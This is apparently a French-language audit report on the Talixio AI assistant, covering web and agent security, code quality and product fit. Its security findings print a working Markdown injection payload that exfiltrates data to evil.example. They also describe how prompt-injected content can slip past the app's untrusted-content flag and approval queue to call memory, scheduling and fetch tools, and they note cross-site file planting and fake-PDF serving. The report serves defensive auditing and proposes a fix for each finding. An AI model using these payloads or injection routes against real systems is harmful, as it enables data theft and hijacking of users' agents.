# Audit complet — Talixio 1.35.2 (12 novembre 2026)

Audit en lecture seule du dépôt au commit `d17a6fb`, en cinq volets : sécurité de la surface web, sécurité côté agent et
navigateur, qualité du code, interface, pertinence produit. Le plan d'exécution qui en découle est dans
[`2026-11-12-plan.md`](2026-11-12-plan.md).

**Niveau de preuve.** Chaque constat porte une étiquette :

- **[exécuté]** : reproduit en lançant l'application ou un script ;
- **[lu]** : établi en lisant le code, non reproduit ;
- **[relu]** : relu une seconde fois dans le code après le rapport initial.

**Limites.** Aucun modèle réel, aucune boîte mail, aucune flotte réelle n'ont été utilisés (fournisseur `echo`). Pour les
injections de prompt, ce qui est établi est l'absence de garde dans le code, pas qu'un modèle obéirait. Non couverts : les
retours OAuth (Google, Microsoft, Spotify, MCP), l'application d'administration au-delà de son écran d'installation, une
partie des scripts Docker, l'intérieur de Board, Library, Mail, Mind, Graph.

## Verdict

- **Sécurité** : une vraie couche de défense existe (file d'approbations, garde « après contenu non fiable », niveaux de
  confidentialité, récupération web à IP épinglée, bacs à sable, CSP). Les failles trouvées sont des trous dans cette couche,
  pas son absence. Quatre sont hautes.
- **Qualité** : le code fonctionne et les deux suites passent, mais l'état repose sur des fichiers JSON fragiles, il n'y a
  pas d'intégration continue, et quelques bugs coûtent de l'argent ou cassent des écrans.
- **Interface** : cohérente dans l'ensemble, avec deux bugs visibles, des débordements sur téléphone, un thème sombre
  partiellement illisible et un français inégal.
- **Produit** : le cœur d'assistant est réel et son différenciateur (confidentialité appliquée dans le code, verrou Europe)
  est solide. Depuis la 1.0, l'effort est parti vers des couches annexes non prouvées en conditions réelles.

## 1. Sécurité

### Haute

**S1 — Injection d'attribut dans le rendu Markdown** [exécuté, relu] — `web/public/app.js:49-61`, `:125`
Les marqueurs de substitution (`\u0000N\u0000`) d'un premier remplacement sont acceptés dans le `href` d'un lien suivant
(classe `[^\s)"]+`), puis développés à l'intérieur de l'attribut. Charge utile démontrée :
`[a](https://evil.example/[b](tel:/style=position:fixed;inset:0;z-index:99999;background:url\(https://evil.example/px?d=DATA\);x:))`.
Résultat en navigateur : attribut `style` contrôlé par l'attaquant, requête immédiate vers le serveur externe sans clic
(la CSP l'autorise : `img-src https:`, styles en ligne), lien couvrant tout l'écran. Un `onmouseover` est aussi injecté ; seule
la CSP bloque son exécution. `md()` rend les réponses de l'assistant, les rapports de tâches et les résultats d'outils
approuvés (`app.js:146,152,170`).
*Correctif* : retirer `\u0000` de l'entrée et l'exclure de toutes les classes de caractères des `href`, comme le fait déjà
la règle des URL nues (ligne 61).

**S2 — Dépôt de fichiers depuis n'importe quel site par `/share`** [exécuté] — `src/Web.php:16`, `:881-953` ;
`web/public/app.js:7555`, `:7590-7598`
`POST /share` est ouvert et n'exige pas l'en-tête `X-Talixio` (cible de partage de la PWA). Une page visitée par le
propriétaire connecté peut soumettre un formulaire : la réponse pose le cookie `talixio_share` et redirige vers
`/?share=<jeton>`, que la SPA réclame toute seule. Jusqu'à 10 fichiers (25 Mo) arrivent dans `/Inbox` avec nom et type
choisis par l'attaquant, et le champ du chat est prérempli. Les fichiers sont ensuite indexés : support durable d'injection
de prompt. Rien n'est envoyé sans appui sur Envoyer.
*Correctif* : confirmation explicite dans l'app avant de réclamer un partage, et/ou n'accepter que `Sec-Fetch-Site: none`
ou `same-origin` ; déduire le type du contenu.

**S3 — Les rapports de tâches de fond blanchissent du contenu non fiable** [lu] — `src/Jobs.php:392-409`,
`src/Director.php:135`, `src/Agent.php:360`, `src/Privacy.php:196-200`
Une tâche lit du web, du mail, des résultats de connecteurs. Son rapport est posté comme message utilisateur dans le fil
principal avec l'outillage complet ; `chat()` remet à zéro `Privacy::$untrusted`, `$links` et `$taint`. Une instruction qui
survit dans le rapport peut alors appeler `memory_append`, `schedule_task` ou `fetch_url` sans approbation. La teinte de
confidentialité de la tâche est perdue de la même façon.
*Correctif* : enregistrer `untrusted` / `links` / `taint` sur la ligne de la tâche et les réappliquer dans le tour de rapport
(idem directives).

**S4 — Sources non fiables qui ne lèvent jamais le drapeau** [lu, relu] — `src/Tools.php:1240-1243`, `:1278` ;
`src/AnthropicProvider.php:17` ; `src/ClaudeCodeProvider.php:32`
`untrustedSource()` ne couvre que `mcp_*`, `browser_*`, `mail_list`, `mail_read`, `mail_triage`, `fetch_url`, `web_search`,
`fleet_inbox`. Manquent :
- la recherche web intégrée du fournisseur (défaut pour `anthropic` et `claude-code`), qui ne passe pas par `Tools::execute` ;
- `file_read`, `kb_search` et les pièces jointes du chat (`Files::parts`) ;
- `calendar_events` (texte d'invitations), présent dans l'outillage du battement de cœur sans surveillance ;
- `peer_inbox`, `peer_status`, `directive_inbox`, `check_inbox` ;
- les résultats d'outils approuvés (`src/Approvals.php:94`, jusqu'à 20 000 caractères rejoués au tour suivant via
  `src/Store.php:273-275`) ;
- la tâche d'apprentissage (`Agent::maybeLearn` → `Jobs::reflect`), qui peut enregistrer une compétence empoisonnée.
*Correctif* : marquer ces sources, marquer sur `server_tool_use`, et conserver le drapeau tant que ce contenu est dans
l'historique.

### Moyenne

**S5 — Liste trop courte des outils soumis à approbation après contenu non fiable** [lu, relu] — `src/Tools.php:1259-1260`
Seuls `memory_*`, `skill_save`, `skill_delete`, `schedule_task`, `kb_move`, `space_notes` sont retenus. Passent sans
contrôle : `fleet_dispatch`, `conductor_dispatch`, `delegate` / `direct` / `continue_job` (jusqu'au plafond par tâche, budgets
à 0 = illimité par défaut), `peer_send`, `peer_publish`, `role_publish`, `asset_publish`, `kb_save_note` avec `id`
(écrase un fichier), `board_*`, `contact_save`, `script_save`, `cancel_task`, `share_revoke`, `fleet_priorities`.
*Correctif* : inverser en liste d'outils en lecture seule autorisés une fois le tour marqué non fiable.

**S6 — L'installation d'un connecteur exécute du code hors bac à sable** [lu] — `src/ConnectorPackage.php:240-272`,
`src/Mcp.php:223-240`
`npm install` (scripts de cycle de vie actifs), `npm run build` et `node node_modules/playwright-core/cli.js install`
tournent par `exec` simple, avec l'utilisateur de l'app ; le `cli.js` peut venir du zip. L'archive GitHub est prise à `HEAD`
sans épinglage ni empreinte (`:47`). L'outil est soumis à approbation, mais le texte d'approbation promet un bac à sable.
*Correctif* : mêmes profils bwrap que l'exécution, `--ignore-scripts`, ne jamais exécuter un `cli.js` livré dans le zip.

**S7 — `shell_run` / `script_run` contournent la confidentialité des espaces** [lu] — `src/Shell.php:56-65`, `:96-108` ;
`src/Tools.php:796-801`, `:1409-1453`
`Shell::run` copie n'importe quel fichier de la bibliothèque dans `/work/in` par `files()->get()`, sans `readableFile` /
`mayRead` ni montée de teinte. `/work` est partagé entre espaces ; `shell_save` saute `noWriteDown`. Avec
`TALIXIO_SHELL=auto`, `shell_run` n'est pas dans la liste après contenu non fiable.
*Correctif* : `readableFile()` + `Privacy::doc()` par identifiant, `noWriteDown` dans `shell_save`, garde après contenu non fiable.

**S8 — Faux PDF servi avec le type déclaré par l'expéditeur** [exécuté] — `src/Web.php:1349-1353`, `:1370-1380` ;
`src/Files.php:14-26`, `:35-65`
Tout nom en `.pdf` est traité comme PDF, le type MIME du client est conservé, et libmagic reconnaît un PDF si `%PDF-`
figure dans un commentaire initial. `GET /api/files/N` a renvoyé `Content-Type: text/javascript` et `text/HTML`. La CSP de
ce chemin (`default-src 'none'; object-src 'self'`, sans `sandbox`) bloque les scripts : contenu inerte ou hameçonnage sur
le vrai domaine. La variante `text/javascript` fournit un script de même origine. Atteignable par envoi, par S2 et par les
liens de partage publics.
*Correctif* : toujours `application/pdf` pour le type pdf ; garde MIME insensible à la casse ; `sandbox` ou téléchargement
forcé si type stocké et type détecté divergent.

**S9 — Les outils navigateur laissent une page hostile recevoir du texte saisi** [lu] — `src/Tools.php:769-771`, `:1289-1302`
`browser_type` sans Entrée n'est jamais contrôlé ; l'approbation n'est demandée que pour un formulaire POST, un champ mot
de passe ou après lecture de mail/connecteur.
*Correctif* : une fois le tour non fiable (ou l'origine non nommée par l'utilisateur), approbation pour toute saisie et tout clic.

**S10 — Une requête de pair fédéré n'est pas confinée à l'espace partagé** [lu] — `src/Tools.php:16`, `:129`, `:350-360` ;
`src/Federation.php:540-553`
`kb_search folder:'/'`, `kb_list`, `kb_recent`, `file_read` atteignent toute la bibliothèque, limités seulement par le niveau
de confidentialité. Le pair contrôle `{param}` (200 caractères).
*Correctif* : dans le rôle pair, épingler `kb_*` et `file_read` au dossier de l'espace de la question.

**S11 — Le tableau des tâches ignore les niveaux de confidentialité** [lu] — `src/Tools.php:908-927`, `src/Board.php:96`
Depuis Général, `board_list all_spaces` et `board_get` renvoient titres et descriptions des espaces Secret et Confidentiel.
*Correctif* : filtrer par `Privacy::mayRead(niveau de l'espace)` et monter la teinte.

### Vérifié et sain

Routes `/api/*` refusées sans session et sans `X-Talixio` (sauf `/share`) ; cookies de session (HttpOnly, SameSite=Strict,
régénération) ; limitation des tentatives par adresse et anti-rejeu TOTP ; secrets hachés et comparés par `hash_equals` /
`password_verify` ; SQL paramétré ; `escapeshellarg` ou tableaux argv partout ; pas de `unserialize` / `eval` ; pas de
traversée de chemin (routeur statique, WebDAV, bibliothèque, extraction zip) ; pas de XXE ; `Http::safeGet` (IP épinglée,
redirections revérifiées) ; liens de partage (jetons 24 octets, mot de passe, niveaux revérifiés) ; tickets SSO ; API des
réglages sur liste blanche ; cadres d'apps isolés (origine opaque, CSP à nonce, `connect-src 'none'`) ; service worker qui ne
met jamais `api/` en cache ; échappement `esc()` cohérent sur ~300 sites `innerHTML` échantillonnés ; conteneurs sans root,
`cap_drop ALL`, système de fichiers en lecture seule.

## 4. Pertinence produit

### Constat

- Depuis la 1.0.0 (27 octobre), environ 22 versions sur 54 portent sur le pilotage de flotte, 13 sur le catalogue de
  modèles, 6 sur l'explorateur de fichiers, 3 sur la fédération, 2 sur les prévisions. Aucune ne porte sur la qualité des
  réponses, le mail ou l'agenda (classement des titres du changelog par l'auditeur).
- 208 versions en 34 jours. Les couches les plus récentes n'ont tourné que sur des simulations, de l'aveu du changelog :
  cockpit de flotte (1.35.x), fédération (1.32–1.34), prévisions (1.31.0).
- Six produits dans un dépôt : assistant personnel, gestionnaire de fichiers, tableau de tâches, console de routage de
  modèles, cockpit d'agents Claude Code, plateforme (multi-locataire, boutique, fédération).
- Huit mécanismes de travail de fond (`delegate`, `schedule_job`, routines, battement, `direct`, `conductor_dispatch`,
  `fleet_dispatch`, `peer_ask`) et un vocabulaire qui se chevauche ; `Fleet.php` gère Docker alors que les outils `fleet_*`
  désignent les agents ; la vue `tasks` s'appelle « Automatisations » et la vue `board` « Tâches ».
- **Le pilote est difficile à suivre pour une raison de fond** : il n'existe pas d'API pour lister ou piloter des sessions
  Claude Code (`docs/design/orchestration.md` §5.1). Le pont est une session orchestrateur qui suit un prompt ; chaque
  incident (1.29.0, 1.29.3, 1.10.1, 1.11.2, 1.30.1) est ce lien qui oublie ou désobéit. Le cockpit a été refait cinq fois.

### Écarts pour un assistant professionnel

| Exigence | État |
|---|---|
| Fiabilité des actions | Forte (approbations, journal d'outils, annulation) |
| Fiabilité des réponses | Inconnue : pas de retour sur les réponses du chat (`/api/feedback` ne couvre que les routines, `src/Web.php:247`), pas de jeu de questions rejoué |
| Mémoire et recherche | Bonne mécanique, non mesurée ; pas de signal de péremption |
| Proactivité | Bonne conception ; pas de suivi des relances |
| Intégrations | Faibles : pas de Slack / Teams / WhatsApp ; Google et Outlook exigent sa propre application OAuth ; mail en IMAP toutes les 15 min |
| Multi-utilisateur | Isolation par conteneur, mais ni rôles ni espace d'équipe (`src/Auth.php`) |
| Confidentialité | Forte ; manquent chiffrement au repos, sauvegardes chiffrées, fichier LICENSE |
| Prise en main | Difficile hors développeurs : 144 variables `TALIXIO_*`, ~130 réglages |
| Coûts et observabilité | Forts |
| Exploitation | `php -S` en production, pas d'intégration continue, restauration manuelle |

### Les trois paris

1. Mesurer la qualité des réponses et de la recherche documentaire.
2. Faire de la boucle mail, agenda et relances quelque chose de meilleur que le faire à la main.
3. Industrialiser le côté souverain : vrai serveur web, sauvegardes chiffrées hors site, installation en 15 minutes.

Sources de comparaison (recherche web mince) : annonce Le Chat de Mistral (connecteurs MCP et mémoire), comparatifs Vellum,
Tensoria et Composio.
